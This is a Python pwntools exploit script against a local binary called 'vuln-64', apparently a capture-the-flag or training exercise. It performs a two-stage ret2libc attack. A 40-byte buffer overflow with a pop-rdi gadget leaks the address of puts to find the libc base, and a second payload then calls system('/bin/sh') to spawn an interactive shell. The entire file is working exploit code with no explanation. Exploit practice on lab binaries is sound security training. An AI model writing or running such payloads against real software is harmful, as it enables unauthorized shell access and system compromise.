from pwn import *

elf = context.binary = ELF('./vuln-64')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
    'A' * 40,
    0x4011cb,        #pop rdi; ret
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
)

p.sendline(payload)

puts_leak = u64(p.recv(6) + b'\x00\x00')
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 40,
    0x4011cb,                              #pop rdi; ret
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system'],
    libc.sym['exit']
)

p.sendline(payload)

p.interactive()
